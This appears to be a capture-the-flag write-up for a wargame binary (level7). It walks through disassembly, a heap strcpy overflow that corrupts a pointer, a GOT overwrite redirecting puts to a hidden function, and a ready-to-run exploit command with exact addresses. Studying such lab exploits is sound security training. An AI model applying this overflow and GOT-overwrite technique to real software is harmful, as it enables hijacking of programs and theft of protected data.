# Way to level8

## Core
`main` builds two heap structs `A` and `B`, each `{ int n; char *buf }` (four `malloc(8)`).
It does `strcpy(A.buf, argv[1])` then `strcpy(B.buf, argv[2])` with **no bounds**, then
`fgets` reads the level8 pass into global `c` (`0x8049960`) — but `main` never prints it.
Only `m()` prints `c` (`printf("%s - %d\n", c, time)`), and `m()` is never called.
Plan: overflow `argv[1]` past `A.buf` to overwrite the **pointer** `B.buf` with `GOT[puts]`;
the second `strcpy` then writes `argv[2]` (= `&m`) into `GOT[puts]`; `main`'s final `puts`
call jumps to `m()`, which prints the already-loaded flag.

## Decisive disass (full: `disas main`, `disas m`, `disas 0x8048400`)
```
main:
<+127>: call strcpy@plt     ; strcpy(A.buf, argv[1]) — no bounds -> overflow into B.buf ptr
<+156>: call strcpy@plt     ; strcpy(B.buf, argv[2]) — B.buf now attacker-chosen -> write-what-where
<+178>: call fopen@plt      ; x/s 0x80486eb = "/home/user/level8/.pass", 0x80486e9 = "r"
<+202>: call fgets@plt      ; fgets(c=0x8049960, 0x44, file) — flag loaded into global c
<+214>: call puts@plt       ; GOT[puts] is hijacked here
m (unused, info functions):
0x080484f4 <+0>             ; m() entry = our target value
<+38>: call printf@plt      ; printf("%s - %d\n", c, ...) — prints global c = the flag
puts@plt:
<+0>:  jmp *0x8049928       ; GOT[puts] = 0x8049928
```

## Exploit
- padding 20 (derivation, gdb): break at `*0x08048588` (before strcpy #1), `run AAAA BBBB`.
  `A.buf = 0x0804a018` (`x/2wx 0x0804a008` → `{1, 0x0804a018}`); the pointer field of B lives
  at `&B.buf = 0x0804a028+4 = 0x0804a02c` (`x/2wx 0x0804a028` → `{2, 0x0804a038}`). Distance
  `0x0804a02c − 0x0804a018 = 0x14 = 20`. We aim at the **pointer slot** `&B.buf`, not B's chunk.
- Values: `GOT[puts] = 0x8049928` (source: `puts@plt+0 jmp *0x8049928`), `m() = 0x080484f4`
  (source: `info functions`/`disas m`+0). Little-endian `\x28\x99\x04\x08`, `\xf4\x84\x04\x08`.
- payload (two args):
  - `argv[1] = 'A'*20 + '\x28\x99\x04\x08'` → strcpy #1 overwrites `B.buf` with `GOT[puts]`.
  - `argv[2] = '\xf4\x84\x04\x08'` → strcpy #2 writes `m()`'s address into `GOT[puts]`.
    (the earlier draft repeated the GOT bytes here by mistake — it must be `m()`'s address)
- Delivery: input is via `argv[1]`/`argv[2]`; the redirected `puts` → `m()` prints the flag,
  so no stdin/cat - trick is needed.
```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

## Diff from previous
level6 was a **single** strcpy overflow overwriting a heap **function pointer** that was
immediately invoked by `call *%eax`. level7 needs **two** strcpy's: #1 overflows `A.buf` to
corrupt `B.buf` into a pointer we choose, #2 uses that corrupted pointer as a **write-what-
where** to patch `GOT[puts]` — a GOT overwrite like level5, but driven by a heap overflow +
strcpy instead of a format string. The redirect lands in `m()`, which prints a flag `main`
already loaded but never showed (vs. level6, where `n()` ran `cat` directly).

